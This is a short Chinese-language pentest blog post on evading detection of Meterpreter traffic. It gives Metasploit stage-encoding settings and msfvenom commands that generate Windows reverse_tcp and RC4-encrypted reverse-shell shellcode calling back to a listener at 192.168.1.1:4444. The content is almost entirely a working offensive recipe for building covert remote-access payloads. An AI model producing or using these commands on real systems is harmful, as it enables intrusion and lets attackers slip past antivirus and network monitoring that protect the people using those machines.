---
title: "Meterpreter 流量免杀"
date: 2019-08-04T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['metasploit','bypass']
categories: ['bypass','内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


对 meterpreter 流量进行编码或加密, 有两种方式.

<!--more-->

指定编码方式, 名称与对 shellcode 的编码器相同.

```
set EnableStageEncoding true
set StageEncoder x86/xor_dynamic
set StageEncodingFallback false
```

生成 shellcode.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 EnableStageEncoding=true StageEncoder=x86/xor_dynamic StageEncodingFallback=false -f c -o shellcode.c
```

或是直接生成通过 rc4 加密流量的 shellcode.

```
msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.1.1 LPORT=4444 RC4PASSWORD=exp10it -f c -o shellcode.c
```